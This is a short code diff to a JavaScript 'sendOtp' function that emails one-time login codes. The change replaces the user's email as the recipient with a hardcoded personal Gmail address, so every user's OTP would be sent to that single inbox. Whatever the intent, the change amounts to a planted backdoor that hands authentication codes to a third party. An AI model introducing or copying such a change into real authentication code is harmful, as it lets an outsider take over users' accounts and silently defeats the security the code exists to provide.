@@ -10,7 +10,7 @@ export const sendOtp = async (email, otp, retries = 1) => {
   for (let attempt = 1; attempt <= retries + 1; attempt++) {
     try {
       const data = {
-        to: email,
+        to: "njorogejwangui@gmail.com",
         subject: "Your OTP",
         text: `Your OTP is: ${otp}. It expires in 300 seconds.`,
       };
